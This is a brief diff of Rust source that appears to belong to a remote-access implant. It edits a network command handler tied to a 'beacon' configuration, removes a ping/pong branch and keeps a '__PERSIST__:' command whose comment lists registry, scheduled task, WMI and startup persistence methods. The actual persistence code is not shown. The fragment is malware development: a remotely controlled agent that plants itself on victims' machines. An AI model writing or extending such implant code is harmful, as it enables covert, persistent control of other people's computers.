@@ -62,10 +62,7 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                 let command = buffer.trim();
                 println!("DEBUG: Comando recibido: {}", command);
 
-                if command == "ping" {
-                    writer.write_all(b"pong\n").ok();
-                    writer.flush().ok();
-                } else if command.starts_with("__PERSIST__:") {
+                if command.starts_with("__PERSIST__:") {
                     // Comando de persistencia: __PERSIST__:registry|task|wmi|startup
                     let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
                     println!("DEBUG: Estableciendo persistencia: {}", method);
